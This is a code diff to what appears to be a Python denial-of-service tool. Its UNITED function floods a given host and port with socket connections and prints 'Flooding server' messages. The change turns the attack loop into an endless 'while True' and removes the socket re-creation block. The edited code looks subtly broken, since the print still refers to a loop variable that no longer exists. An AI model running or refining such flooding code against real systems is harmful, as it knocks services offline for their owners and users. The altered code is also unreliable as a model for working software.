@@ -87,7 +87,7 @@ def UNITED(threads, host, port, mode):
         #host = host
         #port = port
         total_packets = []
-        for _ in range(10000000000000000000000000000000):
+        while True:
             try:
                 
                 print("[-] Flooding server << HOST: %s PORT: %s >> with packets: %s" %(host, port, _))
@@ -113,16 +113,6 @@ def UNITED(threads, host, port, mode):
                         )
                     except socket.error:
                         total_packets.remove(sock)
-
-                for _ in range(10000000000000000000000000000000 - len(total_packets)):
-                    print("[-] Re-creating packet")
-                    try:
-                        sock = sendPacket()
-                        if sock:
-                            total_packets.append(sock)
-                    except socket.error as e:
-                        print(f"[-] {e}")
-                        break
                 print("[-] Re-connecting to the server")
                 time.sleep(2)
 
